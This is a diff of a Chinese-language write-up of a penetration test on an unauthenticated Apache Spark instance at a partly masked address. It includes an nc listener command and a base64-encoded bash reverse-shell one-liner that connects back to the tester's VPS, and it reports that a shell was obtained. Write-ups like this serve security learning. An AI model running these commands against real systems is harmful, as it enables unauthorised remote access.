@@ -1,12 +1,9 @@
-### 坑点总结
-1、阿里云vps开启nc监听时，需要加个参数n，即nc -lnvvvp 101.200.xx.xx 8888，具体原因未知  
-2、当payload位于github上时，需考虑目标可能获取不到  
-
 ### 0x01 打点发现
 团队一起做项目，同事发现一个Apache Spark未授权页面，我这边尝试打点，遂有此文
 ### 0x02 初次尝试
 目标地址：  http://182.61.xxx.xxx:8080  
 网上搜索针对Apache Spark的漏洞复现，用POC直接打，不出意外的攻击失败  
+（这里记录一下：阿里云vps开启nc监听时，需要加个参数n，即nc -lnvvvp 101.200.xx.xx 8888，具体原因未知）  
 ### 0x03 本地调试
 本地搭建环境，使用vulhub项目中的环境：https://github.com/vulhub/vulhub/tree/master/spark/unacc  
 （这里记录一下：搭建环境时，发现端口被占用，netstat -antup查不到占用端口的pid和进程名，原因是权限不够，改用sudo netstat -antup可查到占用端口的pid和进程名，有时容易忽略使用sudo）  
@@ -80,7 +77,8 @@ String[] cmds = args[0].split(",");
 
 bash -c {echo,YmFzaCAtaSA+JiAvZGxxxxxxxxxxxxEuMjAwLjE0NC41NS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
 ```
-知道问题了，我们可以将逗号分隔改为下划线分隔，并打包为jar包（如果仔细看上面的burp请求，会发现我已经在命令之间加了一个下划线）  
+知道问题了，我们可以将逗号分隔改为下划线分隔，并打包为jar包，现成的jar包已经打包好，位于当前目录下  
+（如果仔细看上面的burp请求，会发现我已经在命令之间加了一个下划线）    
 
 再次执行后成功接收到反弹shell  
 ![image](./pic/1.png)  
